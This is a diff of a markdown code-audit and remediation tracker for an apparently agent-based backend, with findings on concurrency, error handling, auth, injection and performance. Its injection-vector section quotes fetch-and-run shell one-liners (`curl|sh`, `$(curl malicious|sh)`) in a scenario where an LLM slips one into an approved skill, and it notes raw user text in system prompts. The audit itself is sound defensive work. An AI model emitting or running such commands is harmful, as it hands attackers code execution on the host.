@@ -5,30 +5,103 @@
 
 ---
 
+## Status legend
+
+- ✅ **closed** — all cited findings remediated, verified by gates
+- 🟡 **partial** — most findings closed; specific deferrals listed inline
+- 🔴 **open** — no remediation landed yet
+
 ## Priority board
 
-| P | Cluster | What breaks today | Scope |
-|---|---|---|---|
-| **P0** | [C1 · CAS disabled, silent lost writes](#c1--cas-disabled--silent-lost-writes) | Concurrent beats, two-writers races, lost mutations | Persistence + task + meeting + trust |
-| **P0** | [C2 · Silent error swallowing](#c2--silent-error-swallowing) | State drifts from DB for minutes before detection | Persistence, heartbeats, audit, event-bridge |
-| **P0** | [C3 · Fire-and-forget on critical paths](#c3--fire-and-forget-on-critical-paths) | Skill pipelines, trust updates, cross-sprint transfers silently vanish | Skills, sprints, heartbeats, hippocampus |
-| **P0** | [C4 · Security — governance off + no auth](#c4--security--governance-off--no-auth) | Any network client can wipe/boot/halt the engine | Beat executor + all route files |
-| **P0** | [C5 · RCE / injection vectors](#c5--rce--injection-vectors) | `shell: true`, skill content lint bypass, pgvector SQL compose, raw err.message | OpenCode, skill governance, hippocampus, routes |
-| **P1** | [C6 · Module-level mutable state TOCTOUs](#c6--module-level-mutable-state-toctous) | Duplicate proposals, duplicate bridges, event-bridge flag stuck | 14+ module-level `let` vars |
-| **P1** | [C7 · No AbortSignal / crash recovery](#c7--no-abortsignal--no-crash-recovery) | SIGTERM, hung LLMs, OpenCode child leaks, stranded beats | Everywhere |
-| **P1** | [C8 · Non-atomic multi-step writes](#c8--non-atomic-multi-step-writes) | Cache vs DB divergence; partial sprints, orphan artifacts | Trust+task, meeting, sprint approve, artifact propagation |
-| **P1** | [C9 · Unbounded memory growth](#c9--unbounded-memory-growth) | Server OOMs after N sprints | Artifacts array, audit ledger, activity log, graph store |
-| **P1** | [C10 · O(n²) + no pagination](#c10-n-scans--no-pagination) | Latency spike as sprint size grows; payload blow-up | Task deps, checklist scans, list endpoints |
-| **P1** | [C18 · Database layer (packages/db)](#c18--database-layer--packagesdb) | jsonb blob schema, missing FKs + indexes, migration races, pool discipline | `packages/db/*` |
-| **P2** | [C11 · Stringly-typed roles/actions/phases](#c11--stringly-typed-rolesactionsphases) | Refactors silently drop roles; typos = bugs | ~80+ sites across 10+ files |
-| **P2** | [C12 · Type-safety leaks (`as any`, `z.unknown()`)](#c12--type-safety-leaks) | Runtime-only guarantees; schema drift | `request.body as {…}`, contracts events, roleTools |
-| **P2** | [C13 · REST anti-patterns](#c13--rest-anti-patterns) | Client SDKs cannot generically parse, no versioning, SSE buffer-overrun | routes/* surface |
-| **P2** | [C14 · God files & god functions](#c14--god-files--god-functions) | Hard to test, hard to refactor, hidden coupling | server, ceo, heartbeat, review, executor |
-| **P2** | [C15 · Observability gaps](#c15--observability-gaps) | Debugging blind spots: truncations, console.log, no decision trail | All |
-| **P3** | [C16 · Dead code / deprecated exports](#c16--dead-code--deprecated-exports) | Confuses readers, blocks refactors | ~15 sites |
-| **P3** | [C17 · Magic constants](#c17--magic-constants) | Tuning requires multi-site edits | ~40+ sites |
+| P | Cluster | Status | What breaks today | Scope |
+|---|---|---|---|---|
+| **P0** | [C1 · CAS disabled, silent lost writes](#c1--cas-disabled--silent-lost-writes) | 🟡 partial | Concurrent beats, two-writers races, lost mutations | Persistence + task + meeting + trust |
+| **P0** | [C2 · Silent error swallowing](#c2--silent-error-swallowing) | 🟡 partial | State drifts from DB for minutes before detection | Persistence, heartbeats, audit, event-bridge |
+| **P0** | [C3 · Fire-and-forget on critical paths](#c3--fire-and-forget-on-critical-paths) | 🟡 partial | Skill pipelines, trust updates, cross-sprint transfers silently vanish | Skills, sprints, heartbeats, hippocampus |
+| **P0** | [C4 · Security — governance off + no auth](#c4--security--governance-off--no-auth) | 🟡 partial | Any network client can wipe/boot/halt the engine | Beat executor + all route files |
+| **P0** | [C5 · RCE / injection vectors](#c5--rce--injection-vectors) | 🟡 partial | `shell: true`, skill content lint bypass, pgvector SQL compose, raw err.message | OpenCode, skill governance, hippocampus, routes |
+| **P1** | [C6 · Module-level mutable state TOCTOUs](#c6--module-level-mutable-state-toctous) | 🟡 partial | Duplicate proposals, duplicate bridges, event-bridge flag stuck | 14+ module-level `let` vars |
+| **P1** | [C7 · No AbortSignal / crash recovery](#c7--no-abortsignal--no-crash-recovery) | 🟡 partial | SIGTERM, hung LLMs, OpenCode child leaks, stranded beats | Everywhere |
+| **P1** | [C8 · Non-atomic multi-step writes](#c8--non-atomic-multi-step-writes) | 🟡 partial | Cache vs DB divergence; partial sprints, orphan artifacts | Trust+task, meeting, sprint approve, artifact propagation |
+| **P1** | [C9 · Unbounded memory growth](#c9--unbounded-memory-growth) | 🟡 partial | Server OOMs after N sprints | Artifacts array, audit ledger, activity log, graph store |
+| **P1** | [C10 · O(n²) + no pagination](#c10-n-scans--no-pagination) | 🟡 partial | Latency spike as sprint size grows; payload blow-up | Task deps, checklist scans, list endpoints |
+| **P1** | [C18 · Database layer (packages/db)](#c18--database-layer--packagesdb) | 🟡 partial | jsonb blob schema, missing FKs + indexes, migration races, pool discipline | `packages/db/*` |
+| **P2** | [C11 · Stringly-typed roles/actions/phases](#c11--stringly-typed-rolesactionsphases) | 🟡 partial | Refactors silently drop roles; typos = bugs | ~80+ sites across 10+ files |
+| **P2** | [C12 · Type-safety leaks (`as any`, `z.unknown()`)](#c12--type-safety-leaks) | ✅ closed | Runtime-only guarantees; schema drift | `request.body as {…}`, contracts events, roleTools |
+| **P2** | [C13 · REST anti-patterns](#c13--rest-anti-patterns) | 🟡 partial | Client SDKs cannot generically parse, no versioning, SSE buffer-overrun | routes/* surface |
+| **P2** | [C14 · God files & god functions](#c14--god-files--god-functions) | 🔴 open | Hard to test, hard to refactor, hidden coupling | server, ceo, heartbeat, review, executor |
+| **P2** | [C15 · Observability gaps](#c15--observability-gaps) | 🟡 partial | Debugging blind spots: truncations, console.log, no decision trail | All |
+| **P3** | [C16 · Dead code / deprecated exports](#c16--dead-code--deprecated-exports) | 🟡 partial | Confuses readers, blocks refactors | ~15 sites |
+| **P3** | [C17 · Magic constants](#c17--magic-constants) | 🔴 open | Tuning requires multi-site edits | ~40+ sites |
 
 **Recommended fix sequence:** C2 → C1 → C4 → C5 → C3 (one-sprint P0 sweep), then C8 + C6 + C7 + C9 (one-sprint P1 sweep), then C11/C12 as umbrella refactors during normal feature work.
+
+---
+
+## Remediation log (chronological)
+
+| Commit | Cluster | What landed |
+|---|---|---|
+| `26b43f3` | C2 | `swallowAndAudit` helper + 31 silent-catch sites migrated |
+| `12199b1` | infra | mandatory ESLint + lint-staged + husky pre-commit + 2 CI jobs |
+| `63d69cf` | C12 (prep) | auto-fix 198 stylistic violations across 142 files |
+| `5f7afa6` | C2/C3/C16 | 70 floating/misused-promise sites + 29 catch-typing + most C16 cleared |
+| `a0213ee` | C2/C3 | 14 bare `.catch(console.X)` → `swallowAndAudit` / `observability.logEvent` |
+| `224f243` | **C4** | admin bearer-token gate on `/api/*` mutations + CORS allow-list + debug-route prod 404 |
+| `99df907` | **C4** | `sanitizeError()` helper for `err.message` leaks (F-429) |
+| `978de53` | **C12** | 286 `no-unsafe-*` sites → 0 in non-TUI/web (event-bridge typed, `(sprint as any)` removed, JSON imports) |
+| `13c282b` | **C12** | F-397 `edge_added` GraphEvent variant; F-365/386 taskAction enums; F-426 Zod `request.body`; F-031 `cardData` discriminated union |
+| `0520084` | C9 | F-045 artifacts ring buffer + F-391/F-392 pendingFlush cap + transitions/feedback log caps |
+| `6259403` | **C8** | 6 read-modify-write helpers wrapped in `db.transaction()` (F-104/F-256/F-277); F-361 `commitScheduledMeeting` transactional dep; F-347 sprint tag-before-flip guard |
+| `701ccc5` | **C7** | F-066 `proc.kill()` on opencode spawn timeout; F-212/F-233 stranded-run sweeper (boot + 5-min periodic) |
+| `0c30f55` | **C6** | New `infra/gates.ts` (`TryRunGate` + `OncePromise`); F-273/F-274/F-290 `eventBridgeOnce` dedups concurrent SSE starts; F-043/F-315 `sprintCompletionGate` atomic re-entry guard; dead `ceoProposal*` triplet deleted |
+
+### Cluster-by-cluster status
+
+**C2 (silent error swallowing) — 🟡 partial**
+- ✅ Closed: 31 sites via `swallowAndAudit` migration, 14 bare `.catch(console.X)` chains routed through observability error sink, ESLint `no-restricted-syntax` gate live, `scripts/check-no-silent-catch.ts` enforced in pre-commit.
+- 🔴 Open: F-391/F-392 audit-ledger overflow handling beyond pendingFlush cap (full DB-failure recovery story); F-349 QA-parse fallback semantics; F-394 SSE subscriber cleanup audit pass; ~15 audit-cited `.catch(console.warn)` sites in deeper async chains.
+
+**C3 (fire-and-forget critical paths) — 🟡 partial**
+- ✅ Closed: 81 `no-floating-promises` + `no-misused-promises` sites across 18 files; ATA pipeline routed through `swallowAndAudit`; `recordCeoCardMeeting` awaited (F-319); `attachArtifactToTask` made async with real bug fix.
+- 🔴 Open: no persistent job queue / DLQ infrastructure exists yet; F-273/F-274/F-290 `setEventBridgeStarted(true)` race; failures are now observable but not retryable.
+
+**C4 (security — governance off + no auth) — 🟡 partial**
+- ✅ Closed: F-424 admin bearer token on every mutating `/api/*` route; F-428 debug routes 404 in prod; F-438 approvals gated; F-450 CORS allow-list; F-429 `sanitizeError()` for client error responses.
+- 🔴 Open: F-255/F-257 `GOVERNANCE_ENABLED = false` flip (deliberate deferral per user); web frontend Next.js Route Handler proxy still needs to inject admin token for `ARCEUS_REQUIRE_AUTH=1`.
+
+**C6 (module-level mutable state TOCTOUs) — 🟡 partial**
+- ✅ Closed: F-273/F-274/F-290 `eventBridgeStarted` race (replaced with `OncePromise` — first caller starts the SSE bridge, concurrent callers share the same promise, auto-clears on settle so failed starts retry); F-043/F-315 `sprintCompletionTriggered` race (`checkSprintCompletion` body now runs inside `TryRunGate.runExclusive`, atomic claim+release); F-315/F-319 `ceoProposalInFlight` (was dead state — three vars + setters + resets deleted, no callers existed). New `apps/api/src/infra/gates.ts` with 6 unit tests.
+- 🔴 Open: F-305/F-306 `activeExecution` cleared before async work finishes (not a flag race — needs a context-passing refactor where downstream awaits receive `ExecutionContext` as a parameter instead of reading the global); F-204 `beatCounter` two-beats-same-id race (needs `Counter.incrementAndGet()` primitive); F-328 `agentSessions` Map mutated in place via `Object.assign` (pattern fix — "always replace, never mutate" — not a TOCTOU primitive).
+
+**C7 (no AbortSignal / crash recovery) — 🟡 partial**
+- ✅ Closed: F-066 opencode child SIGTERM/SIGKILL on spawn timeout + spawn error (no more orphan processes across deploys); F-212/F-233 stranded-run sweeper (boot pass with 0ms threshold + periodic 5-min sweep at 30-min stall threshold; uses pre-existing `findStrandedRuns` / `markStranded` repo helpers and the partial index that was already in the schema); F-302 reconnect backoff already in place (exponential + jitter + reset-on-success).
+- 🟡 Partial: F-395/F-348 `runPromptText` / `structuredCompletion` have request-level `AbortSignal.timeout(REQUEST_TIMEOUT)`, but no caller-passed signal — SIGTERM can't cancel a 5-min LLM call mid-flight; F-292 `detectExistingOpencodeServer` has a 2s AbortController, `startEventBridge` fetch does not.
+- 🔴 Open: F-247/F-262/F-307 (no AbortSignal threaded through checklist → executor → execution-cycle chain); F-293 (SSE `reader.read()` infinite loop has no `reader.cancel()` on shutdown).
+
+**C8 (non-atomic multi-step writes) — 🟡 partial**
+- ✅ Closed: F-104/F-256 read-modify-write atomicity (6 `updateX` helpers wrapped in `db.transaction()`); F-277 meeting contributions atomic on the persistence side; F-347 sprint completion blocks status flip until tagSprint succeeds; F-361 scheduler fires meeting + advances schedule via single `commitScheduledMeeting` transaction.
+- 🔴 Open: F-305 `setActiveExecution(null)` TOCTOU (re-classified as C6 — module-level state, not a DB write); F-364 ensure-daily-sync race (needs unique constraint `(company_id, type, date)` + INSERT…ON CONFLICT — separate migration); F-350 sprint approval (createSprint + N×createTask + updateSprint atomicity needs persistSprint/persistTask refactor to accept tx parameter).
+
+**C9 (unbounded memory growth) — 🟡 partial**
+- ✅ Closed: F-045 `artifacts[]` ring buffer (`MAX_RECENT_ARTIFACTS=500`); F-391/F-392 `pendingFlush` cap (`MAX_PENDING_FLUSH=10_000`) with drop-oldest counter; transitionsLog/feedbackRoundsLog capped at 500; F-394/F-398 already capped pre-audit (activity log 2000 + SSE close cleanup); F-361 priming `recentEvents` already capped (slice(0, 5)).
+- 🔴 Open: F-393 graph store retention + 11 node-collection caps; F-417 pgvector `list()` cursor pagination (3 store impls + 4 service callers).
+
+**C12 (type-safety leaks) — ✅ closed**
+- All cited findings remediated: F-426 `request.body as { ... }` Zod-parsed in 7 routes; F-257 `(roleTools as any)` cleared; F-433/F-453 `body.role/kind as any` subsumed by F-426; F-031 `cardData` discriminated union (other freeform `z.record` uses documented as intentional); F-397 `edge_added` GraphEvent variant; F-365/F-386 taskAction enums; F-296/F-297 OpenCodeEvent typed.
+- Net: 286 `no-unsafe-*` sites → 0 in non-TUI/web. ESLint surface 1016 → 737.
+
+**C15 (observability gaps) — 🟡 partial**
+- ✅ Closed: pendingFlush counter exposed via `/api/audit/status`; `sanitizeError()` includes `correlationId` for client/server log joining.
+- 🔴 Open: ~30 `console.log/warn/error` sites in prod paths (F-037/F-237/F-323/F-343/F-402); truncations without `…` markers (F-094 family); checklist decision audit trail (F-248); SSE keepalive heartbeats; `X-Request-Id` on every error response.
+
+**C16 (dead code / deprecated) — 🟡 partial**
+- ✅ Closed: 37/49 deprecated callsites; 33 pgTable schemas migrated to array form; `runPatternPromotionSweep` route migrated to `runCrossSprintTransfer`; `z.string().url()` → `z.url()`.
+- 🔴 Open: 12 `trustScoresTable` callsites (intentional — Spec 31b deferred migration; legacy text-PK score model coexists with canonical role_trust band model).
+
+**C18 (database layer) — 🟡 partial**
+- ✅ Closed: drift test gates schema vs canonical agreement (5/5 pass); migration runner via canonical schema definitions; pgTable signature migrated.
+- 🔴 Open: F-174 jsonb-blob extraction (the big one — `company_states.snapshot_data` still holds tasks/sprints/meetings inline); FK + index pass; `pg_advisory_lock` migration discipline; atomic counter updates.
 
 ---
 
@@ -43,14 +116,30 @@
 | [control-plane.ts](apps/api/src/persistence/control-plane.ts) — `cpApplyMutations` | Master mutation lane | F-086, F-088 |
 | [mutations.ts](apps/api/src/tasks/mutations.ts) | Task status + artifact propagation | F-215, F-216, F-258, F-281, F-374 |
 | [review.ts](apps/api/src/sprints/review.ts) — `updateSprint` | Dual reviewState writes race | F-345, F-346 |
-| [proposals.ts](apps/api/src/sprints/proposals.ts) — `approveSprintProposal` | Task creation loop, no tx | F-350 |
+| [proposals.ts](apps/api/src/sprints/proposals.ts) — `createSprintWithTasks` | Sprint insert + task-batch insert + status flip not atomic | F-350 |
 | [meeting-pipeline.ts](packages/company-runtime/src/meeting-pipeline.ts) — `updateMeeting` | Full-object overwrite on status transition | F-277, F-359 |
 | [meeting-scheduler.ts](packages/company-runtime/src/meeting-scheduler.ts) | Skip-count, total-runs, upsert+schedule pair | F-351 (cluster), F-361 |
-| [lifecycle.ts](apps/api/src/sprints/lifecycle.ts) — `finalizeSprintCompletion` | Write + `tagSprint` + persist non-atomic | F-347 |
+| [lifecycle.ts](apps/api/src/sprints/lifecycle.ts) — `finalizeSprintCompletion` | Tag-first ordering shipped (closed) | F-347 |
 
 **Why it matters:** two heartbeats for the same task both flip to `in_progress`; two agents contributing to a meeting lose a write; review phase oscillates because handlers race. This is the single biggest class of bug in the codebase.
 
-**Fix pattern:** compound `UPDATE … WHERE version = ?` returning the new row (Paperclip's `issues.ts:1779-1851` is the reference). On miss → 409, never retry in place. Wrap dependent writes in the same transaction as the owning status flip.
+**Fix pattern (revised, see [Spec 33](../specs/33-cas-concurrency-protection.md)):** Paperclip uses **zero version columns**. Three primitives instead:
+
+- **Pattern A — `SELECT … FOR UPDATE` row lock** at the top of read-modify-write transactions
+- **Pattern B — `UPDATE … WHERE id = ? AND status = expectedFrom`** for status transitions (illegal prior state ⇒ zero rows ⇒ caller decides)
+- **Atomic SQL counters** — `SET col = col + 1` with no read-modify-write window
+
+The audit's original "use Paperclip's `issues.ts:1779-1851`" reference was a misread — that range is a child-issue lister, not a CAS site. Paperclip's actual pattern lives at `services/issues.ts:1202` (`syncBlockedByIssueIds`) and `:1329` (`clearExecutionRunIfTerminal`).
+
+**Status:**
+- ✅ **Phase 1** — task claim CAS — already shipped pre-audit (`packages/db/src/repos/tasks.ts:claimTask`).
+- ✅ **Phase 2** — Pattern A row locks across 7 repos (`tasks`, `sprints`, `meetings`, `meeting_schedules`, `approvals`, `companies`, `memory_summaries`); wired into all `update*` helpers in `apps/api/src/persistence/mutations.ts`. Closes F-104, F-256, F-215, F-216, F-345, F-346, F-277, F-359 lost-update gaps.
+- ✅ **Phase 3** — `meetingsRepo.transitionStatus` + `meeting-pipeline.ts` swap. 5 status flips now atomic with prior-state guard; completion flip keeps Phase 2 lock + inline assertion.
+- ✅ **Phase 4** — `meetingSchedulesRepo.incrementCounter` + `markSkipped` (atomic skip+timestamps); scheduler skip path swapped.
+- ✅ **F-347 closed** — `finalizeSprintCompletion` already implements tag-first ordering at [lifecycle.ts:217-226](apps/api/src/sprints/lifecycle.ts:217). `tagCurrentSprintSnapshot()` runs before the status flip; on tag failure the function returns and leaves the sprint in `reviewing` (recoverable). The post-flip writes (`appendChatMessage`, fire-and-forget `runCrossSprintTransfer`) are best-effort and do not violate the invariant.
+- 🟡 **Open — F-350 only:** `proposals.ts createSprintWithTasks` is multi-table (sprint INSERT + N task INSERTs + sprint status flip + auto-promote) with no transaction. Failure mid-batch leaves a partially-populated sprint stranded. Agreed approach: wrap the function body in `getDb().transaction(async (tx) => { ... })` and call repo functions (`sprintsRepo.upsertSprint(tx, …)`, `tasksRepo.upsertTask(tx, …)`) directly inside the block; the existing topo-sort still serves the intra-batch task→task FK ordering. Persist helpers' FK-retry path is bypassed inside the tx (FK violations they retry against can't occur there). **Implementation deferred — tracked here.**
+
+Tests: `packages/db/src/repos/locks.test.ts` — 10 concurrency tests (Pattern A serialization, Pattern B status guard, atomic counters), all passing against live Postgres.
 
 ---
 
@@ -123,14 +212,15 @@
 
 **Root cause:** several privilege-escalation paths that only luck has kept out of prod.
 
-| Vector | Where | Flaw IDs |
-|---|---|---|
-| `spawn(..., { shell: true })` | [opencode.ts](apps/api/src/infra/opencode.ts) | F-063 |
-| `npm run build` / child scripts pass user-controllable env | [opencode.ts](apps/api/src/infra/opencode.ts) / workspace manager | F-087 |
-| Skill-content shell lint patterns are incomplete | [governance.ts:44-54](apps/api/src/skills/governance.ts) — incomplete regexes miss Unicode homoglyphs, double-escaped backticks, `bash -c "curl|sh"` in prose | F-330 |
-| Habit-ID SQL composition via `sql.join()` + template strings | [pgvector.ts:389-401](packages/hippocampus/src/backends/pgvector.ts) | F-406 |
-| User-controlled strings concatenated into system prompts raw | [ceo.ts:374-395](apps/api/src/agents/ceo.ts), [developer.ts](apps/api/src/prompts/developer.ts), [specialist.ts](apps/api/src/prompts/specialist.ts) | F-318 (+ cluster) |
-| Raw `err.message` back to client | Route layer (10+ handlers) | F-429 |
+| Vector | Where | Flaw IDs | Status |
+|---|---|---|---|
+| `spawn(..., { shell: true })` | [opencode.ts](apps/api/src/infra/opencode.ts) | F-063 | ✅ closed — POSIX uses `shell: false`; Windows-only conditional retained for `.cmd` shim resolution |
+| `npm run build` / child scripts pass user-controllable env | [opencode.ts](apps/api/src/infra/opencode.ts) / workspace manager | F-087 | 🔴 open |
+| Skill-content shell lint patterns are incomplete | [governance.ts:44-54](apps/api/src/skills/governance.ts) — incomplete regexes miss Unicode homoglyphs, double-escaped backticks, `bash -c "curl\|sh"` in prose | F-330 | 🔴 open |
+| Habit-ID SQL composition via `sql.join()` + template strings | [pgvector.ts:389-401](packages/hippocampus/src/backends/pgvector.ts) | F-406 | 🔴 open |
+| User-controlled strings concatenated into system prompts raw | [ceo.ts:374-395](apps/api/src/agents/ceo.ts), [developer.ts](apps/api/src/prompts/developer.ts), [specialist.ts](apps/api/src/prompts/specialist.ts) | F-318 (+ cluster) | 🔴 open |
+| Raw `err.message` back to client | Route layer (10+ handlers) | F-429 | ✅ closed (commit `99df907` — `sanitizeError()` helper) |
+| Other `shell: true` sites (preview.ts, control-plane.ts, verification-gate.ts, workspaces.routes.ts) | 4 sites | (not in F-063 audit, but related) | 🔴 open — workspace command spawn (preview.ts) is by-design "run user's code"; the other 3 are mechanical argv refactors |
 
 **Why it matters:** approved skill runs shell. Lint misses one pattern. LLM suggests `$(curl malicious|sh)` inside a proposed skill; governance signs off; bash executes. Dead end.
 
@@ -214,17 +304,20 @@
 
 **Root cause:** repeated linear `.find()` inside `.filter()`, repeated `getSnapshot()` per function, no pre-indexing on snapshot construction; every list endpoint returns the whole array.
 
-| Site | Cost | Flaw IDs |
-|---|---|---|
-| Task-dep lookups — `tasks.filter(id ⇒ tasks.find(id))` twice | O(n²) per beat | F-198, F-298, F-324, F-378 |
-| Checklist — 14 `ctx.tasks.filter(...)` per developer beat | Repeated scans | F-245 |
-| `setTaskStatus` — 3-5 `getSnapshot()` calls per call | Redundant snapshot builds | F-385 |
-| Skill registry — `getAllSkills` full-scans per health check; rebuild `activeSkillIndex` on every register | O(n²) on writes | F-336, F-337 |
-| Event-bridge per-event policy load | N+1 DB queries on high-volume streams | F-294 |
-| Pgvector `cosineDistance` without index hint | Full table scan on every retrieval | F-411 |
-| List routes — 16 endpoints return unbounded arrays | Large payloads + clients force-cache | F-432 |
+| Site | Cost | Flaw IDs | Status |
+|---|---|---|---|
+| Task-dep lookups — `tasks.filter(id ⇒ tasks.find(id))` twice | O(n²) per beat | F-198, F-298, F-324, F-378 | 🔴 deferred (perf-only, scale-dependent) |
+| Checklist — 14 `ctx.tasks.filter(...)` per developer beat | Repeated scans | F-245 | 🔴 deferred |
+| `setTaskStatus` — 3-5 `getSnapshot()` calls per call | Redundant snapshot builds | F-385 | 🔴 bundled with C14 PR 10 (mutations.ts split) |
+| Skill registry — `getAllSkills` full-scans per health check; rebuild `activeSkillIndex` on every register | O(n²) on writes | F-336, F-337 | 🔴 deferred |
+| Event-bridge per-event policy load | N+1 DB queries on high-volume streams | F-294 | 🔴 deferred |
+| Pgvector `cosineDistance` without index hint | Full table scan on every retrieval | F-411 | ✅ **incorrectly classified — index existed from migration 0000.** Verified pgvector 0.8.2 + `memory_embeddings_embedding_idx` (ivfflat, vector_cosine_ops, lists=100) on local DB. |
+| List routes — 16 endpoints return unbounded arrays | Large payloads + clients force-cache | F-432 | 🟠 **carve-out: ship hard cap now** (cursor pagination defer) |
 
-**Fix pattern:** pre-index on `AgentBeatContext` construction (`byStatus`, `byId`, `byAssignee`); pass precomputed indexes into checks; add HNSW/IVFFlat indexes for pgvector; cursor-paginate every list route with a 500 hard cap.
+**Fix pattern:** pre-index on `AgentBeatContext` construction (`byStatus`, `byId`, `byAssignee`); pass precomputed indexes into checks; cursor-paginate every list route with a 500 hard cap.
+
+**Ship-now carve-out (rest defer until scale demands):**
+- F-432 (partial): global `HARD_LIST_CAP = 500` middleware on all 16 list endpoints. Prevents accidental DoS / payload bloat without a full cursor-pagination refactor.
 
 ---
 
